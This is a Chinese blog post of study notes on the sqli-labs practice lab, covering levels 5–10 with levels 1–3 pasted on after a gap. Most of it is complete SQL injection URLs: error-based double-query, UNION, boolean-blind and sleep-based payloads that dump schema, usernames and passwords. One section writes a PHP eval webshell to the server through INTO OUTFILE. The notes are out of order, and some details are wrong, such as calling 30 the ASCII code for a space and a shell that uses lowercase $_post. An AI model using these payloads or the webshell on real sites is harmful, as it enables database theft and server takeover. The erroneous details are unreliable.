---
title: sqli-labs_混合学习笔记less05-less10
categories:
- sql注入
tags:
- sqli-labs
updated: 2018-07-12
---



 使用sqlmap进行注入的时候，确实是很方便，但是要是用不好的话，很多时候网站上都是有waf之类的，基本上很多站确定存在漏洞，但是只要是使用的话，全部都会被ban ip，所以现在重新用手工加部分sqlmap的方法进行注入学习。（手工还是要学习的，确定是跑不掉的。。。  要是有waf的话，需要更多的绕过技术。。。）

ps:     空格是%20        单引号%27            #是%23             双引号%22     等号 %3d

**Less-5双注入GET单引号字符型注入** 

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less5_01.png" />

没有像以前那样给出用户的名字和密码。。。（所以就不能使用less1-less4里面的方法了）

先用sqlmap用一下，看下效果：（其实没waf，跑的也慢,更新sqlmap很重要）

  `Sqlmap -u "http://127.0.0.1/Less-5/?id=1" --dbs`

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less5_02.png" />

接下来就是各种--tables    --columns   --dump之类的。。。

手工：

`http://127.0.0.1/Less-5/?id=1'`

加'之后报错：

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less5_03.png" />

即存在漏洞（其实我也不知道）

这个时候可以看下sql语句： `你的sql语句是：SELECT * FROM users WHERE id='1'' LIMIT 0,1` 

```php
`if($row)`
`{`
  echo '&lt;font size="5" color="#FFFF00"&gt;';	
  echo 'You are in...........';
  echo "&lt;br&gt;";
    echo "&lt;/font&gt;";
 `}`
```

这里面根本就没有输出 $row 这个查询结果，从各处大佬的笔记里知道这个叫双注入：

双查询注入：

子查询，查询的关键字是select，子查询可以简单的理解在一个select语句里还有一个select。里面的这个select语句就是子查询。 

比如：   Select concat((select database())); 

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less5_04.png" />

​	真正执行的时候，先从子查询进行。因此执行select database() 这个语句就会把当前的[数据库](http://www.2cto.com/database/)查出来，然后把结果传入到concat函数。这个函数是用来连接的。比如 concat(‘a’,’b’)那结果就是ab了。

 原理：				双注入查询需要理解四个函数/语句

1. Rand() //随机函数

2. Floor() //取整函数

3. Count() //汇总函数

4. Group by clause //分组语句 

   简单的一句话原理就是有研究人员发现，当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。 

   先使用命令查看当前所有数据库： show databases；（记得加s）

   <img src="{{ site.url }}/assets//blog_images/sqli-labs_less5_05.png" />

 use security;

select concat((select database()));

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less5_06.png" />

 select concat("1","2");

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less5_07.png" />

再测试一下：rand（）

select  rand();

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less5_08.png" />

多执行几次，发现每一次都是不一样的，每一次返回的都是0~1之间的数

取整函数

Select floor(1.27272);

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less5_09.png" />

floor()函数就是返回小于等于你输入的数的整数。也就是向下取整呗！

看看双注入查询中的一个简单组合 ：

 SELECT floor(rand()*2); 

 SELECT floor(rand()); 

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less5_10.png" />



rand() 返回大于0小于1的小数，乘以2之后就成了小于0小于2了。然后对结果进行取证。就只能是0或1了。也就是这个查询的结果不是1，就是0 

然后接下来：   `SELECT CONCAT((SELECT database()), FLOOR(RAND()*2));`

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less5_11.png" />

SELECT database() 这个就返回数据库名，这里就是security了。然后FLOOR(RAND()*2)这个上面说过了。不是0，就是1.然后把这两个的结果进行concat连接，那么结果不是security0就是security1了。

 如果我们把这条语句后面加上from 一个表名。那么一般会返回security0或security1的一个集合。数目是由表本身有几条结果决定的。比如一个管理表里有5个管理员。这个就会返回五条记录，这里users表里有13个用户，所以返回了13条 

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less5_12.png" />

如果是从information_schema.schemata里，这个表里包含了mysql的所有数据库名。这里本机有三个数据库。所以会返回三个结果 

 `SELECT CONCAT((SELECT database()), FLOOR(RAND()*2)) from information_schema.schemata ;`

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less5_13.png" />



然后可以使用句子：

```sql
select count(*), concat((select database()), floor(rand()*2))as a from information_schema.tables group by a;
```

​        <img src="{{ site.url }}/assets//blog_images/sqli-labs_less5_14.png" />

查询结果会以报错的形式展现出来：（固定公式）

less5中： `http://127.0.0.1/Less-5/?id=-1' union select count(*),2,concat('*',(select database()),'*',floor(rand()*2))as a from information_schema.tables group by a--+`

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less5_15.png" />

获取到数据库名后再用同样的方法获取表名： 

`http://localhost/sqli-labs-master/Less-5/?id=-1' union select count(*),2,concat('*',(select group_concat(table_name) from information_schema.tables where table_schema='security'),'*',floor(rand()*2))as a from information_schema.tables group by a--+`

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less5_16.png" />

（其实我还是比较推荐使用sqlmap，事情少。。。）



**Less-6双注入GET双引号字符型注入** 

还是使用和less5一样的方法：只是用的是   “   

`http://127.0.0.1/Less-6/?id=-1" union select count(*),2,concat('*',(select concat_ws(char(32,44,32),id,username,password) from users limit 0,1),'*',floor(rand()*2))as a from information_schema.tables group by a--+`  



<img src="{{ site.url }}/assets//blog_images/sqli-labs_less6_01.png" />



**Less-7导出文件GET字符型注**

 

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less7_01.png" />

这个时候显示的是 ： You are in.... Use outfile...... （如果使用sqlmap工具的话，是非常的漫长的等待的。。。）

弹出 Use outfile，尝试之前的方法行不通了，他把报错做了处理统一返回“You have an error in your SQL syntax”，明显的，他也给出了提示use outfile，outfile的固定结构是：select A into outfile B，这里的B通常是一个文件路径，A可以是文本内容（小马），也可以是数据库信息，先尝试写木马进去：

**导入到文件**

SELECT.....INTO OUTFILE 'file_name'

可以把被选择的行写入一个文件中。该文件被创建到服务器主机上，因此您必须拥有FILE权限，才能使用此语法。file_name不能是一个已经存在的文件。

我们一般有两种利用形式：

第一种直接将select内容导入到文件中：

Select version() into outfile "c:\\phpnow\\htdocs\\test.php"

此处将version()替换成一句话，<?php @eval($_post["mima"])?>也即

Select  <?php @eval($_post["mima"])?>  into outfile "c:\\phpnow\\htdocs\\test.php"

直接连接一句话就可以了，其实在select内容中不仅仅是可以上传一句话的，也可以上传很多的内容。

   

第二种修改文件结尾：

Select version() Into outfile "c:\\phpnow\\htdocs\\test.php" LINES TERMINATED BY 0x16进制文件

解释：通常是用'\r\n'结尾，此处我们修改为自己想要的任何文件。同时可以用FIELDS TERMINATED BY 
16进制可以为一句话或者其他任何的代码，可自行构造。在sqlmap中os-shell采取的就是这样的方式，具体可参考os-shell分析文章：http://www.cnblogs.com/lcamry/p/5505110.html 



然后介绍两个可以说是函数，还是变量的东西

@@datadir 读取数据库路径
@@basedir MYSQL 获取安装路径

然后在第三关的时候，使用 这个查看一下（首先使用order by看下里面有多少个字段（很重要，不然到时候钩爪的时候会出现问题））

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less7_02.png" />

字段数是3，然后用刚才的知识进行构造：

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less7_03.png" />

这个时候就得到了路径  

Your Login name:C:\phpStudy\PHPTutorial\MySQL\data\ 

Your Password:C:/phpStudy/PHPTutorial/MySQL/ 

然后尝试去写一句话木马：

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less7_03.png" />

这个是写3到123.txt中，但是在我却没发现这个文件。。。估计是这个写的权限没了，，，

如果可以的话，就直接写一句话了：union select 1,2,"<? php  @eval($_post['mima']) ?>" into outfile "文件路径"%23

然后再使用菜刀进行连接即可！

##### **Less - 8 布尔型单引号GET盲注 

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less8_01.png" />

直接加 ‘ 试一下什么都没有了。。。  使用order by 语句也没有回显。。。

盲注的话，主要分为bool型和时间性，通常涉及到这几个函数:

length(str)：返回字符串str的长度

substr(str,pos,len)：将str从pos位置开始截取len长度的字符返回，需要注意的是这里pos的是从1开始的

mid(str,pos,len)：和substr()类似

ascii(str)：返回字符串str最左边的acsii码（即首字母的acsii码）

ord()：同上，返回acsii码

left(str,len)：对字符串str左截取len长度

right(str,len)：对字符串str右截取len长度

if(a,b,c)：条件判断，如果a为true，返回b，否则返回c

盲注有个固定式：and ascii(substr(A,1,1))>B，或者and if(ascii(substr(A,1,1))>B,1,0)，这里的A通常是一个select语句，B则是字符或数字的ascii码，他们的中心思想都是通过substr等截取函数以二分法的形式查询逐个匹配想要的信息，这个过程通常都很耗时，所以建议直接写个盲注脚本来跑

如果使用sqlmap的话，速度其实并不是很快

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less8_02.png" />

还是使用手工试一下吧（工具都不快，手工更慢了）：

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less8_03.png" />

http://172.16.60.103/sql-labs/Less-8/?id=1' and (ascii(substr((select database()),1,1)))  < 170 %23

显示you are in。。。 证明这个就是正确的

如果将值换为20的话，到时候就不会显示you are in。。。了，证明就是大于大于20小于170了。

然后就是小于115，这个时候是没有回显的，对照ascii表，证明了这个值就是116，也就是s

还是直接从网上找到了脚本，跑一下比较合适（sqlmap也行）



**Less-9 基于时间的GET单引号盲注** 

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less9_01.png" />

时间型盲注和bool型盲注应用场景不同之处在报错的返回上，从less-8我们知道，输入合法时他会返回正常页面“You are in......”，而非法输入时他没有返回任何东西，于是，我们可以根据这个特点跑盲注，通过他不同的返回页面来判断我们匹配的字符是否正确，而在less-9中合法输入与非合法输入它都返回一个页面，就是You are in.....这样，我们就不能根据他页面的返回内容来判断匹配结果了，因此我们需要用延时函数sleep()对两种输入进行区分，可以构造如下语句：

http://172.16.60.103/sql-labs/Less-9/?id=1'and if(ascii(substr((select database()),1,1)) >115,0,sleep(5))%23

如果时间不够久的话，可以设置延时为20，其余的就和8是一样的了



**Less-10 基于时间的双引号盲注**

直接将less9中的单引号改为双引号就可以了（好难啊）





















































看到在id=''中，order by 在“中，所以要想猜字段的话，需要先将以前的语句进行闭合，闭合之后才可以继续猜解。（**ORDER BY 语句用于根据指定的列对结果集进行排序，而且是按照升序对记录进行排序**）

构造：`http://172.16.60.103/sql-labs/Less-1/?id=1' order by 5%23`

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_06.png" />

这个时候有错误，然后依次尝试（其实可以使用数据结构中的二分法进行比较合适）

只有1，2，3是正常的，4的时候就开始出错了，显示结果超出。

使用select union语句：`http://172.16.60.103/sql-labs/Less-1/?id=1' union select 1,2,3%23`

页面并没有什么变化，这个时候只要将id=0，-1（非正数） 都行：

`http://172.16.60.103/sql-labs/Less-1/?id=-1' union select 1,2,3%23`

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_07.png" />

可以看到只有第二列和第三列的结果可以正常显示在网页上，但是这两个位置并不够用，需要使用数据库连接函数，常用的是concat ；concat_ws，其中concat_ws的第一个参数是连接字符串的分隔符。

user():返回当前数据库连接使用的用户

database():返回当前使用的数据库

version():返回当前数据库版本

在这里，concat_ws的第一个参数是连接字符串的分割符，下图可以看的很清楚：

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_08.png" />

但是就算是这样的话，也不能直接进行传递的，因为在传的时候会被html编码，所以这个时候要使用mysql中的一个函数进行转化：char()   将十进制转化为字符 （：的十进制ASCII是 58   空格的十进制ASCII是30）

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_09.png" />

然后进行构造： concat_ws(char(32,58,32),user(),database(),version())

放在里面直接进行判断有：（concat直接使用是NULL）

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_10.png" />

构造语句有：`http://172.16.60.103/sql-labs/Less-1/?id=1' union select 1,2,concat_ws(char(32,58,32),user(),database(),version())--+`

如果是这样的话，因为没有报错，所以是不会出现你所需要的信息的

需要将id=1 修改为 id= -1 （0 或者是shshh都行）

`http://172.16.60.103/sql-labs/Less-1/?id=-1' union select 1,2,concat_ws(char(32,58,32),user(),database(),version())--+`

这个时候就有了报错信息，就可以得到你想要的数据了

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_11.png" />

依次是：  数据库用户root@localhost  ；数据库名字 security ；数据库版本5.5.53



然后就是查询接下来数据库中的表了：

mysql的数据库information_schema，他是系统数据库，安装完就有，记录是当前数据库的数据库，表，列，用户权限等信息，下面说一下常用的几个表：

SCHEMATA表：储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等，show databases的结果取之此表。

TABLES表：储存mysql中的表信息，（当然也有数据库名这一列，这样才能找到哪个数据库有哪些表嘛）包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等。show  tables from schemaname的结果取之此表

COLUMNS表：提供了表中的列信息，（当然也有数据库名和表名称这两列）详细表述了某张表的所有列以及每个列的信息，包括该列是那个表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等。是show  columns from schemaname.tablename的结果取之此表。

注意，查询information_schema中的信息时，使用where语句，那个值不能直接用英文，要用单引号包裹着，当然用其十六进制表示也可以，数值类型的就不用单引号了，这对过滤单引号应该有指导意义。

security的十六进制转换是：0x7365637572697479（可以使用在线转码工具，也可以使用hackbar，使用hackbar的时候记得前面要加上0x  代表16进制）

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_12.png" />

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_13.png" />

直接使用security是无法进行查询到的，所以需要使用'  '  或者是使用十六进制（不需加''）

然后就是直接构造：

`http://172.16.60.103/sql-labs/Less-1/?id=-1' union select 1,2,table_name from information_schema.tables where table_schema ='security'%23`

这个时候返回：

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_14.png" />

但是发现此时只出现了一个表，名字是：emails

所以接下来使用**limit关键字**，

1.语法：

  *** limit [offset,] rows

  一般是用于select语句中用以从结果集中拿出特定的一部分数据。

  offset是偏移量，表示我们现在需要的数据是跳过多少行数据之后的，可以忽略；rows表示我们现在要拿多少行数据。比如：

  ①select * from mytbl limit 10000,100

​    上边SQL语句表示从表mytbl中拿数据，跳过10000行之后，拿100行

  ②select * from mytbl limit 0,100

​    表示从表mytbl拿数据，跳过0行之后，拿取100行

  ③select * from mytbl limit 100

​    这条SQL跟②的效果是完全一样的，表示拿前100条数据

​    但是在数据量不大或者是大数据量的前几页的时候，性能还算不坏，但是大数据量页码稍微大一点性能便下降比较严重。原因出在Limit的偏移量offset上，比如limit 100000,10虽然最后只返回10条数据，但是偏移量却高达100000，数据库的操作其实是拿到100010数据，然后返回最后10条。（关于这个，可以参考相关教程，这里就不讨论了）

例子：

sql语句根据条件查询指定数量的数据

SELECT * form 表名 WHERE 条件 limit 5,10; //检索6-15条数据

SELECT * form 表名 WHERE 条件 limit 5,-1; //检索6到最后一条数据

SELECT * form 表名 WHERE 条件 limit 5; //检索前5条数据

接下来：

limit 1,2 返回第二行和第三行，其中，1表示的是第二行，2表示的是行数为2

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_15.png" />

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_16.png" />

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_17.png" />

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_18.png" />

如果是超过字段的话，就不会显示：（空集）

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_19.png" />

在数据库中查看没有出入：

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_20.png" />

接下来就是查询users表中的列：（users的信息比较重要）

`http://172.16.60.103/sql-labs/Less-1/?id=-1' union select 1,2,column_name from information_schema.columns where table_schema ='security' and table_name='users' limit 1,2%23`

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_21.png" />

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_22.png" />

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_23.png" />

在数据库中查询没有出入：

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_24.png" />

在这里面，最重要的就是 username，password了

然后继续选择出来里面的值:

构造：

 `http://172.16.60.103/sql-labs/Less-1/?id=-1' union select 1,2,concat_ws(char(32,58,32),id,username,password) from users limit 0,1%23`

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_25.png" />

依次对应的是：id，账户，密码

然后使用limit全部列出即可;

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_26.png" />

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_27.png" />

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_28.png" />

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_29.png" />

太多了。。。我就不列举了

或者是使用另外一种方法可以使用group分组取代limit将所有的信息列出来

如下：   使用group_concat()

`http://172.16.60.103/sql-labs/Less-1/?id=-1' union select 1,2,group_concat(char(32),username,char(32)) from users limit 0,1%23`

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_30.png" />

这个时候就可以列出所有的账号了。。。

**sql-labs_less-2**   基于错误的GET整型注入

这个和第一个基本上都是一样的，唯一的区别就是$id 没有加单引号

那就和1是一样的，将-1后面的单引号去掉就好了，完整做一遍：

order by 猜字段：到4 的时候报错，1，2，3都是正常的

`http://172.16.60.103/sql-labs/Less-2/?id=-1 order by 4%23`

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less2_01.png" />

然后和第一个一样：`http://127.0.0.1/Less-2/?id=-1 union select 1,2,concat_ws(char(32,58,32),version(),user(),database())%23`

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less2_02.png" />

这个时候就知道了 数据库用户root@localhost  ；数据库名字 security ；数据库版本5.5.53

再次使用：  `http://127.0.0.1/Less-2/?id=-1%20union%20select%201,2,table_name%20from%20information_schema.tables%20where%20table_schema%20=%20%27security%27%23`

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less2_03.png" />

一直使用limit，直到出现：users（出现是在limit 3,1%23）

`http://127.0.0.1/Less-2/?id=-1%20union%20select%201,2,column_name%20from%20information_schema.columns%20where%20table_schema%20=%20%27security%27%20and%20table_name%20=%20%27users%27%20limit%201,2%23`

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less2_04.png" />

查询账号和密码：

`http://127.0.0.1/Less-2/?id=-1 union select 1,2,concat_ws(char(32,58,32),id,username,password) from users limit 0,1%23`

或者是使用group_concat()： `http://127.0.0.1/Less-2/?id=-1%20union%20select%201,2,group_concat(char(32),username,char(32))%20from%20users%20limit%200,1%23`

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less2_05.png" />

然后使用函数也可以获得password：

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less2_06.png" />

结合两个函数使用的话，直接对应账号和密码：

`http://127.0.0.1/Less-2/?id=-1%20union%20select%201,2,group_concat(char(32),password,char(32),username,char(32))%20from%20users%20limit%200,1%23`

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less2_07.png" />





**sql-labs_less-3**  **GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)** 

  多多练习手工技术：（**注意一定要让id的值为0，负等**）

再次记一下：

SCHEMATA表:储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等，show databases的结果取之此表。

TABLES表:储存mysql中的表信息，（当然也有数据库名这一列，这样才能找到哪个数据库有哪些表嘛）包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等。show tables from schemaname的结果取之此表

COLUMNS表：提供了表中的列信息，（当然也有数据库名和表名称这两列）详细表述了某张表的所有列以及每个列的信息，包括该列是那个表中的第几列，列的数据类型，列的编码类型，列的权限，猎德注释等。是show columns from schemaname.tablename的结果取之此表。 

`http://127.0.0.1/Less-3/?id=-1')  union select 1,2,concat_ws(char(32,58,32),user(),database(),version()) %23`

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less4_01.png" />

`http://127.0.0.1/Less-3/?id=-1')  union select 1,2,table_name from information_schema.tables where table_schema = 'security' %23`

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less4_02.png" />

`http://127.0.0.1/Less-3/?id=-1')  union select 1,2,column_name from information_schema.columns where table_schema = 'security' and table_name = 'users' limit 1,1 %23`

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less4_03.png" />

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less4_04.png" />

then：

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less4_05.png" />

`http://127.0.0.1/Less-3/?id=-1')  union select 1,2,group_concat(char(32),username,char(32)) from users limit 0,1%23`

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less4_06.png" />

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less4_07.png" />



